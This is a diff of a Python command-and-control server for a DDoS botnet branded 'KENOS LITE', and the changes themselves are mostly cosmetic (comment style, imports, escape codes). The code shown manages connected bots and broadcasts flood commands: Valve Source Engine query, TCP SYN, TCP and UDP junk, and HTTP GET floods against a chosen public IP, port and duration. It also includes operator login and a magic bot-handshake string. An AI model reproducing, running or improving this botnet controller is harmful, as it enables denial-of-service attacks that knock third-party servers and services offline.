@@ -1,7 +1,9 @@
 #!/usr/bin/env python3
-#-*- coding: utf-8 -*-import socket
+#-*- coding: utf-8 -*-
 # CNC Server
 
+# Lib
+import socket
 import threading
 import sys
 import time
@@ -11,34 +13,34 @@ from colorama import Fore, init, ipaddress
 bots = {}
 ansi_clear = '\033[2J\033[H'
 
-banner = '''[0;38;2;0;255;255m                                  ▄ •▄ ▄▄▄ . ▐ ▄       .▄▄ · 
-[0;38;2;0;246;255m                                  █▌▄▌▪▀▄.▀·•█▌▐█▪     ▐█ ▀. 
-[0;38;2;0;237;255m                                  ▐▀▀▄·▐▀▀▪▄▐█▐▐▌ ▄█▀▄ ▄▀▀▀█▄
-[0;38;2;0;228;255m                                  ▐█.█▌▐█▄▄▌██▐█▌▐█▌.▐▌▐█▄▪▐█
-[0;38;2;0;219;255m                                  ·▀  ▀ ▀▀▀ ▀▀ █▪ ▀█▄▀▪ ▀▀▀▀  x1b[0mLITE'''
+banner = '''\x1b[0;38;2;0;255;255m                                  ▄ •▄ ▄▄▄ . ▐ ▄       .▄▄ · 
+\x1b[0;38;2;0;246;255m                                  █▌▄▌▪▀▄.▀·•█▌▐█▪     ▐█ ▀. 
+\x1b[0;38;2;0;237;255m                                  ▐▀▀▄·▐▀▀▪▄▐█▐▐▌ ▄█▀▄ ▄▀▀▀█▄
+\x1b[0;38;2;0;228;255m                                  ▐█.█▌▐█▄▄▌██▐█▌▐█▌.▐▌▐█▄▪▐█
+\x1b[0;38;2;0;219;255m                                  ·▀  ▀ ▀▀▀ ▀▀ █▪ ▀█▄▀▪ ▀▀▀▀  \x1b[0mLITE'''
 
 def validate_ip(ip):
-    """ validate IP-address """
+    # Validate IP
     parts = ip.split('.')
     return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private
     
 def validate_port(port, rand=False):
-    """ validate port number """
+    # Validate port
     if rand:
         return port.isdigit() and int(port) >= 0 and int(port) <= 65535
     else:
         return port.isdigit() and int(port) >= 1 and int(port) <= 65535
 
 def validate_time(time):
-    """ validate attack duration """
+    # Validate attack time
     return time.isdigit() and int(time) >= 10 and int(time) <= 1300
 
 def validate_size(size):
-    """ validate buffer size """
+    # Validate buffer size
     return size.isdigit() and int(size) > 1 and int(size) <= 65500
 
 def find_login(username, password):
-    """ read credentials from logins db """
+    # Read credentials from login file
     credentials = [x.strip() for x in open('logins.txt').readlines() if x.strip()]
     for x in credentials:
         c_username, c_password = x.split(':')
@@ -46,7 +48,7 @@ def find_login(username, password):
             return True
 
 def send(socket, data, escape=True, reset=True):
-    """ send data to client or bot """
+    # Send data to client or bot
     if reset:
         data += Fore.RESET
     if escape:
@@ -54,7 +56,7 @@ def send(socket, data, escape=True, reset=True):
     socket.send(data.encode())
 
 def broadcast(data):
-    """ send command to all bots """
+    # Send command to all bots
     dead_bots = []
     for bot in bots.keys():
         try:
@@ -66,7 +68,7 @@ def broadcast(data):
         bot.close()
 
 def ping():
-    """ check if all bots are still connected to C2 """
+    # Check if all bots are still connected to C2
     while 1:
         dead_bots = []
         for bot in bots.keys():
@@ -145,7 +147,7 @@ def command_line(client):
                 time.sleep(1)
                 break
             
-            # Valve Source Engine query flood
+            # VSE Flood
             elif command == '.VSE':
                 if len(args) == 4:
                     ip = args[1]
@@ -165,7 +167,7 @@ def command_line(client):
                 else:
                     send(client, 'Usage: .vse [IP] [PORT] [TIME]')
 
-            # TCP SYNchronize flood           
+            # TCP-SYN flood           
             elif command == '.SYN':
                 if len(args) == 4:
                     ip = args[1]
@@ -186,7 +188,7 @@ def command_line(client):
                     send(client, 'Usage: .syn [IP] [PORT] [TIME]')
                     send(client, 'Use port 0 for random port mode')
                     
-            # TCP junk data packets flood
+            # TCP Junk (Random TCP Data)
             elif command == '.TCP':
                 if len(args) == 5:
                     ip = args[1]
@@ -210,7 +212,7 @@ def command_line(client):
                 else:
                     send(client, 'Usage: .tcp [IP] [PORT] [TIME] [SIZE]')
 
-            # UDP junk data packets flood
+            # UDP Junk (Random UDP Data)
             elif command == '.UDP':
                 if len(args) == 5:
                     ip = args[1]
@@ -235,7 +237,7 @@ def command_line(client):
                     send(client, 'Usage: .udp [IP] [PORT] [TIME] [SIZE]')
                     send(client, 'Use port 0 for random port mode')
 
-            # HTTP GET request flood
+            # HTTP GET Flood
             elif command == '.HTTP':
                 if len(args) == 3:
                     ip = args[1]
@@ -270,7 +272,7 @@ def handle_client(client, address):
             continue
         break
 
-    # password login
+    # Password login
     password = ''
     while 1:
         send(client, ansi_clear, False)
@@ -279,7 +281,7 @@ def handle_client(client, address):
             password = client.recv(1024).decode('cp1252').strip()
         break
         
-    # handle client
+    # Handle client
     if password != '\xff\xff\xff\xff\75':
         send(client, ansi_clear, False)
 
@@ -292,9 +294,9 @@ def handle_client(client, address):
         threading.Thread(target=update_title, args=(client, username)).start()
         threading.Thread(target=command_line, args=[client]).start()
 
-    # handle bot
+    # Handle bot
     else:
-        # check if bot is already connected
+        # Check if bot is already connected
         for x in bots.values():
             if x[0] == address[0]:
                 client.close()
